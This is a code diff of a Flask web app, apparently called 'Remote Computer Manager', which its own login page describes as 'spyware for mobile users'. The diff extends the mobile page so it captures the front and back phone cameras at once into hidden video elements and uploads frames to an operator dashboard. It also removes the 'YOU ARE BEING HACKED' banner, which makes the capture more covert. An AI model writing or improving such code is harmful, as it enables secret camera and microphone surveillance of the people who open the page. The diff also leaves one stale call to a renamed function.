@@ -621,15 +621,40 @@ HTML = r"""
             background: #180d14;
         }
 
-        #cameraImage {
+        .camera-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .camera-grid figure {
+            margin: 0;
+            min-width: 0;
+        }
+
+        .camera-grid img {
             display: block;
             width: 100%;
-            max-width: 1000px;
             height: auto;
-            margin-top: 15px;
             border-radius: 6px;
             border: 1px solid #63304f;
             background: #180d14;
+        }
+
+        .camera-grid figcaption {
+            margin-top: 6px;
+            text-align: center;
+            color: #b98fa8;
+            font-size: 10px;
+            letter-spacing: 1.4px;
+            text-transform: uppercase;
+        }
+
+        @media (max-width: 860px) {
+            .camera-grid {
+                grid-template-columns: 1fr;
+            }
         }
 
         .photo-grid {
@@ -2321,7 +2346,16 @@ HTML = r"""
         Camera is off.
     </p>
 
-    <img id="cameraImage" style="display:none;">
+    <div class="camera-grid">
+        <figure>
+            <img id="cameraImage" alt="Back camera" style="display:none;">
+            <figcaption>Back camera</figcaption>
+        </figure>
+        <figure>
+            <img id="cameraImageFront" alt="Front camera" style="display:none;">
+            <figcaption>Front camera</figcaption>
+        </figure>
+    </div>
 
 </section>
 
@@ -3136,6 +3170,7 @@ async function disconnectComputer(reason) {
     document.getElementById("screenshot").style.display = "none";
     document.getElementById("streamImage").style.display = "none";
     document.getElementById("cameraImage").style.display = "none";
+    document.getElementById("cameraImageFront").style.display = "none";
 
     document.getElementById("streamButton").textContent =
         "Start Screen Share";
@@ -5470,7 +5505,27 @@ const CAMERA_REFRESH_MS = 500;
 
 let cameraRunning = false;
 let cameraTimer = null;
-let cameraObjectUrl = null;
+let cameraObjectUrls = {
+    back: null,
+    front: null
+};
+
+
+function cameraFeed(camera) {
+    return camera === "front"
+        ? document.getElementById("cameraImageFront")
+        : document.getElementById("cameraImage");
+}
+
+
+function revokeCameraFrames() {
+    for (const camera of Object.keys(cameraObjectUrls)) {
+        if (cameraObjectUrls[camera]) {
+            URL.revokeObjectURL(cameraObjectUrls[camera]);
+            cameraObjectUrls[camera] = null;
+        }
+    }
+}
 
 
 async function toggleCamera() {
@@ -5492,7 +5547,6 @@ async function startCamera() {
 
     const button = document.getElementById("cameraButton");
     const status = document.getElementById("cameraStatus");
-    const image = document.getElementById("cameraImage");
 
     try {
 
@@ -5511,7 +5565,8 @@ async function startCamera() {
         cameraRunning = true;
 
         button.textContent = "Stop Camera";
-        image.style.display = "block";
+        cameraFeed("back").style.display = "none";
+        cameraFeed("front").style.display = "none";
         status.textContent = "Waiting for the camera...";
 
         logEvent(
@@ -5536,23 +5591,42 @@ async function startCamera() {
 }
 
 
+function finishCameraStop(message) {
+
+    cameraRunning = false;
+    clearTimeout(cameraTimer);
+    cameraTimer = null;
+
+    document.getElementById("cameraButton").textContent = "Start Camera";
+    document.getElementById("cameraStatus").textContent = message;
+    cameraFeed("back").style.display = "none";
+    cameraFeed("front").style.display = "none";
+
+    revokeCameraFrames();
+
+    showToast(
+        message,
+        "error",
+        "Camera stopped"
+    );
+}
+
+
 async function stopCamera() {
 
     const button = document.getElementById("cameraButton");
     const status = document.getElementById("cameraStatus");
-    const image = document.getElementById("cameraImage");
 
     cameraRunning = false;
     clearTimeout(cameraTimer);
+    cameraTimer = null;
 
     button.textContent = "Start Camera";
     status.textContent = "Camera is off.";
-    image.style.display = "none";
+    cameraFeed("back").style.display = "none";
+    cameraFeed("front").style.display = "none";
 
-    if (cameraObjectUrl) {
-        URL.revokeObjectURL(cameraObjectUrl);
-        cameraObjectUrl = null;
-    }
+    revokeCameraFrames();
 
     if (!currentComputer) {
         return;
@@ -5582,6 +5656,55 @@ async function stopCamera() {
 }
 
 
+async function pollCameraFeed(camera) {
+
+    try {
+
+        const response = await fetch(
+            "/api/camera/frame/" +
+            encodeURIComponent(currentComputer) +
+            "?camera=" + camera +
+            "&t=" + Date.now(),
+            { cache: "no-store" }
+        );
+
+        if (response.ok) {
+
+            const blob = await response.blob();
+            const image = cameraFeed(camera);
+
+            if (cameraObjectUrls[camera]) {
+                URL.revokeObjectURL(cameraObjectUrls[camera]);
+            }
+
+            cameraObjectUrls[camera] = URL.createObjectURL(blob);
+            image.src = cameraObjectUrls[camera];
+            image.style.display = "block";
+
+            return { live: true, error: "" };
+        }
+
+        let message = "Waiting for the camera...";
+
+        try {
+            const data = await response.json();
+            message = data.error || message;
+        } catch {}
+
+        if (message === "No frame available") {
+            message = "Waiting for the camera...";
+        }
+
+        return { live: false, error: message };
+
+    } catch (error) {
+
+        console.error(error);
+        return { live: false, error: "" };
+    }
+}
+
+
 async function pollCamera() {
 
     if (!cameraRunning) {
@@ -5589,75 +5712,39 @@ async function pollCamera() {
     }
 
     const status = document.getElementById("cameraStatus");
-    const image = document.getElementById("cameraImage");
 
-    try {
+    const results = await Promise.all([
+        pollCameraFeed("back"),
+        pollCameraFeed("front")
+    ]);
 
-        const response = await fetch(
-            "/api/camera/frame/" +
-            encodeURIComponent(currentComputer) +
-            "?t=" + Date.now(),
-            { cache: "no-store" }
-        );
-
-        if (response.ok) {
-
-            const blob = await response.blob();
-
-            if (cameraObjectUrl) {
-                URL.revokeObjectURL(cameraObjectUrl);
-            }
-
-            cameraObjectUrl = URL.createObjectURL(blob);
-            image.src = cameraObjectUrl;
-
-            status.textContent =
-                "Live camera - " +
-                new Date().toLocaleTimeString();
-
-        } else {
-
-            let message = "Waiting for the camera...";
-
-            try {
-                const data = await response.json();
-                message = data.error || message;
-            } catch {}
-
-            if (message === "No frame available") {
-                message = "Waiting for the camera...";
-            }
-
-            status.textContent = message;
-
-            if (message !== "Waiting for the camera...") {
-
-                cameraRunning = false;
-                clearTimeout(cameraTimer);
-
-                document.getElementById("cameraButton").textContent =
-                    "Start Camera";
-
-                image.style.display = "none";
-
-                showToast(
-                    message,
-                    "error",
-                    "Camera stopped"
-                );
-            }
-        }
-
-    } catch (error) {
-        console.error(error);
+    if (!cameraRunning) {
+        return;
     }
 
-    if (cameraRunning) {
-        cameraTimer = setTimeout(
-            pollCamera,
-            CAMERA_REFRESH_MS
-        );
+    const live = results.some(result => result.live);
+    const fatal = results[0].error;
+
+    if (live) {
+
+        status.textContent =
+            "Live camera - " +
+            new Date().toLocaleTimeString();
+
+    } else if (fatal && fatal !== "Waiting for the camera...") {
+
+        finishCameraStop(fatal);
+        return;
+
+    } else {
+
+        status.textContent = "Waiting for the camera...";
     }
+
+    cameraTimer = setTimeout(
+        pollCamera,
+        CAMERA_REFRESH_MS
+    );
 }
 
 
@@ -6531,7 +6618,13 @@ LOGIN_HTML = r"""
     <div class="mark"></div>
 
     <h1>Remote Computer Manager</h1>
-    <p class="sub">Sign in to open the dashboard</p>
+    <p class="sub">
+        {% if mobile_next %}
+        Sign in to use the mobile version on this phone
+        {% else %}
+        Sign in to open the dashboard
+        {% endif %}
+    </p>
 
     {% if error %}
     <div class="error">{{ error }}</div>
@@ -6591,9 +6684,15 @@ LOGIN_HTML = r"""
             download instead
         </a>
 
+        {% if mobile_next %}
+        <a class="alt-link" href="/login">
+            back to dashboard sign-in
+        </a>
+        {% else %}
         <a class="alt-link" href="/mobile">
             use website version spyware for mobile users
         </a>
+        {% endif %}
 
     </div>
 
@@ -6804,37 +6903,6 @@ MOBILE_HTML = r"""
             text-transform: uppercase;
         }
 
-        .hacked {
-            display: flex;
-            min-height: 62vh;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-        }
-
-        h1.glitch {
-            position: relative;
-            margin: 0;
-            font-size: clamp(26px, 9vw, 44px);
-            line-height: 1.05;
-            letter-spacing: 2px;
-            text-align: center;
-            color: #ff5fa2;
-            text-shadow:
-                0 0 18px rgba(255, 59, 141, 0.45),
-                2px 0 #00ffa3,
-                -2px 0 #7a5cff;
-            animation: glitch 3.2s infinite steps(1);
-        }
-
-        @keyframes glitch {
-            0%, 92%, 100% { transform: none; }
-            93% { transform: translate(-2px, 1px); }
-            94% { transform: translate(3px, -1px); }
-            95% { transform: translate(-1px, 0); }
-            96% { transform: translate(2px, 1px); }
-        }
-
         [hidden] {
             display: none !important;
         }
@@ -6917,7 +6985,6 @@ MOBILE_HTML = r"""
     <button id="retryCamera" hidden>Ask for camera again</button>
     <button id="retryMic" hidden>Ask for microphone again</button>
     <button id="retryPhotos" hidden>Ask for pictures again</button>
-    <button id="flipCamera" hidden>Use front camera</button>
 </div>
 
 <div class="banner" id="requestBanner" hidden>
@@ -6925,11 +6992,8 @@ MOBILE_HTML = r"""
     <button id="bannerPick">Choose pictures</button>
 </div>
 
-<main class="hacked" id="hackedView">
-    <h1 class="glitch">YOU ARE BEING HACKED</h1>
-</main>
-
 <video id="preview" class="ghost-media" playsinline autoplay muted></video>
+<video id="previewFront" class="ghost-media" playsinline autoplay muted></video>
 <div id="log" hidden></div>
 <input id="photoInput" type="file" accept="image/*" multiple hidden>
 
@@ -6941,14 +7005,13 @@ const retryRow = document.getElementById("retryRow");
 const retryCamera = document.getElementById("retryCamera");
 const retryMic = document.getElementById("retryMic");
 const retryPhotos = document.getElementById("retryPhotos");
-const flipButton = document.getElementById("flipCamera");
+const previewFront = document.getElementById("previewFront");
 const requestBanner = document.getElementById("requestBanner");
 
 let deviceName = localStorage.getItem("remoteMobileName") || "";
-let cameraStream = null;
+let cameraStreams = { back: null, front: null };
 let micStream = null;
 let audioContext = null;
-let facingMode = "environment";
 let cameraGranted = false;
 let micGranted = false;
 let cameraDenied = false;
@@ -6964,8 +7027,15 @@ let micPending = [];
 let micPendingSamples = 0;
 let heartbeatScheduled = false;
 
-const canvas = document.createElement("canvas");
-const context2d = canvas.getContext("2d");
+const cameraVideos = { back: preview, front: previewFront };
+const cameraCanvases = {
+    back: document.createElement("canvas"),
+    front: document.createElement("canvas")
+};
+const cameraContexts = {
+    back: cameraCanvases.back.getContext("2d"),
+    front: cameraCanvases.front.getContext("2d")
+};
 
 
 function logLine(text, cls) {
@@ -6982,12 +7052,8 @@ function refreshPermissionUI() {
     retryCamera.hidden = !cameraDenied;
     retryMic.hidden = !micDenied;
     retryPhotos.hidden = !(photosDenied && !photoCount);
-    flipButton.hidden = !cameraGranted;
-    flipButton.textContent = facingMode === "environment"
-        ? "Use front camera"
-        : "Use back camera";
     retryRow.hidden = !cameraDenied && !micDenied
-        && !(photosDenied && !photoCount) && !cameraGranted;
+        && !(photosDenied && !photoCount);
 }
 
 
@@ -7021,11 +7087,11 @@ async function registerDevice() {
 }
 
 
-async function getCameraStream() {
+async function getCameraStream(facing) {
     const size = { width: { ideal: 1280 }, height: { ideal: 720 } };
     try {
         return await navigator.mediaDevices.getUserMedia({
-            video: Object.assign({ facingMode: { ideal: facingMode } }, size),
+            video: Object.assign({ facingMode: { ideal: facing } }, size),
             audio: false
         });
     } catch (error) {
@@ -7037,7 +7103,27 @@ async function getCameraStream() {
 }
 
 
-async function askCamera() {
+async function openCamera(slot, facing) {
+    try {
+        const stream = await getCameraStream(facing);
+        if (cameraStreams[slot]) {
+            cameraStreams[slot].getTracks().forEach(track => track.stop());
+        }
+        cameraStreams[slot] = stream;
+        cameraVideos[slot].srcObject = stream;
+        cameraVideos[slot].play().catch(() => {});
+        logLine("> " + slot + " camera permission granted", "dim");
+        return true;
+    } catch (error) {
+        cameraStreams[slot] = null;
+        cameraVideos[slot].srcObject = null;
+        logLine("! " + slot + " camera unavailable: " + error.message, "err");
+        return false;
+    }
+}
+
+
+async function askCameras() {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
         cameraGranted = false;
         cameraDenied = true;
@@ -7045,26 +7131,16 @@ async function askCamera() {
         refreshPermissionUI();
         return false;
     }
-    try {
-        const stream = await getCameraStream();
-        if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
-        cameraStream = stream;
-        preview.srcObject = stream;
-        preview.play().catch(() => {});
-        cameraGranted = true;
-        cameraDenied = false;
+    const back = await openCamera("back", "environment");
+    const front = await openCamera("front", "user");
+    cameraGranted = back || front;
+    cameraDenied = !cameraGranted;
+    if (cameraGranted) {
         cameraWarned = false;
-        logLine("> " + facingMode + " camera permission granted", "dim");
         if (cameraActive) startCameraLoop();
-        refreshPermissionUI();
-        return true;
-    } catch (error) {
-        cameraGranted = false;
-        cameraDenied = true;
-        logLine("! camera permission denied: " + error.message, "err");
-        refreshPermissionUI();
-        return false;
     }
+    refreshPermissionUI();
+    return cameraGranted;
 }
 
 
@@ -7102,18 +7178,10 @@ async function askMicrophone() {
 
 
 async function requestPermissions() {
-    await askCamera();
+    await askCameras();
     await askMicrophone();
     refreshPermissionUI();
     heartbeat();
-}
-
-
-async function flipCameraMode() {
-    facingMode = facingMode === "environment" ? "user" : "environment";
-    logLine("> switching to " + (facingMode === "environment" ? "back" : "front") + " camera", "dim");
-    refreshPermissionUI();
-    if (cameraGranted) await askCamera();
 }
 
 
@@ -7124,10 +7192,10 @@ function stopMedia() {
     cameraTimer = null;
     micPending = [];
     micPendingSamples = 0;
-    [cameraStream, micStream].forEach(stream => {
+    [cameraStreams.back, cameraStreams.front, micStream].forEach(stream => {
         if (stream) stream.getTracks().forEach(track => track.stop());
     });
-    cameraStream = null;
+    cameraStreams = { back: null, front: null };
     micStream = null;
     cameraGranted = false;
     micGranted = false;
@@ -7136,6 +7204,7 @@ function stopMedia() {
         audioContext = null;
     }
     preview.srcObject = null;
+    previewFront.srcObject = null;
 }
 
 
@@ -7208,10 +7277,11 @@ function flushMicrophone() {
 }
 
 
-function uploadFrame(blob) {
+function uploadFrame(blob, camera) {
     if (!blob || !deviceName) return;
     const form = new FormData();
     form.append("name", deviceName);
+    form.append("camera", camera);
     form.append("frame", blob, "frame.jpg");
     fetch("/upload-camera", { method: "POST", body: form }).catch(() => {});
 }
@@ -7219,23 +7289,26 @@ function uploadFrame(blob) {
 
 function cameraLoop() {
     cameraTimer = null;
-    if (!cameraActive || !cameraStream) return;
-    if (preview.videoWidth) {
-        const width = Math.min(960, preview.videoWidth);
-        const height = Math.round(preview.videoHeight * (width / preview.videoWidth));
+    if (!cameraActive) return;
+    for (const slot of ["back", "front"]) {
+        const video = cameraVideos[slot];
+        const canvas = cameraCanvases[slot];
+        if (!cameraStreams[slot] || !video.videoWidth) continue;
+        const width = Math.min(960, video.videoWidth);
+        const height = Math.round(video.videoHeight * (width / video.videoWidth));
         if (canvas.width !== width || canvas.height !== height) {
             canvas.width = width;
             canvas.height = height;
         }
-        context2d.drawImage(preview, 0, 0, width, height);
-        canvas.toBlob(uploadFrame, "image/jpeg", 0.6);
+        cameraContexts[slot].drawImage(video, 0, 0, width, height);
+        canvas.toBlob(blob => uploadFrame(blob, slot), "image/jpeg", 0.6);
     }
     cameraTimer = setTimeout(cameraLoop, 900);
 }
 
 
 function startCameraLoop() {
-    if (cameraTimer || !cameraActive || !cameraStream) return;
+    if (cameraTimer || !cameraActive || !cameraGranted) return;
     cameraLoop();
 }
 
@@ -7430,7 +7503,6 @@ async function leaveSession() {
 retryCamera.addEventListener("click", () => { askCamera(); });
 retryMic.addEventListener("click", () => { askMicrophone(); });
 retryPhotos.addEventListener("click", openPicker);
-flipButton.addEventListener("click", flipCameraMode);
 photoInput.addEventListener("change", handlePhotoPicked);
 document.getElementById("bannerPick").addEventListener("click", openPicker);
 document.getElementById("leaveButton").addEventListener("click", leaveSession);
@@ -7853,6 +7925,7 @@ def login():
         LOGIN_HTML,
         error=error,
         next_url=next_url,
+        mobile_next=next_url.startswith("/mobile"),
         username=username
     )
 
@@ -9253,7 +9326,9 @@ def start_camera():
             "active": True,
             "error": "",
             "frame": None,
-            "timestamp": 0.0
+            "timestamp": 0.0,
+            "front_frame": None,
+            "front_timestamp": 0.0
         }
 
         if client.get("kind") != "mobile":
@@ -9284,6 +9359,8 @@ def stop_camera():
             state["error"] = ""
             state["frame"] = None
             state["timestamp"] = 0.0
+            state["front_frame"] = None
+            state["front_timestamp"] = 0.0
 
         client = clients.get(name)
 
@@ -9301,6 +9378,7 @@ def upload_camera():
 
     name = request.form.get("name")
     error_text = request.form.get("error", "")
+    camera_slot = "front" if request.form.get("camera") == "front" else "back"
     uploaded_file = request.files.get("frame")
 
     if not name:
@@ -9318,6 +9396,7 @@ def upload_camera():
             state["active"] = False
             state["error"] = error_text[:500]
             state["frame"] = None
+            state["front_frame"] = None
 
             return jsonify({"success": True})
 
@@ -9332,8 +9411,12 @@ def upload_camera():
         if not frame_data.startswith(b"\xff\xd8"):
             return jsonify({"error": "Invalid JPEG frame."}), 400
 
-        state["frame"] = frame_data
-        state["timestamp"] = time.time()
+        if camera_slot == "front":
+            state["front_frame"] = frame_data
+            state["front_timestamp"] = time.time()
+        else:
+            state["frame"] = frame_data
+            state["timestamp"] = time.time()
 
     return jsonify({"success": True})
 
@@ -9355,7 +9438,10 @@ def camera_frame(name):
         if not state["active"]:
             return jsonify({"error": "Camera stopped on the computer."}), 404
 
-        frame_data = state["frame"]
+        if request.args.get("camera") == "front":
+            frame_data = state.get("front_frame")
+        else:
+            frame_data = state["frame"]
 
     if not frame_data:
         return jsonify({"error": "No frame available"}), 404
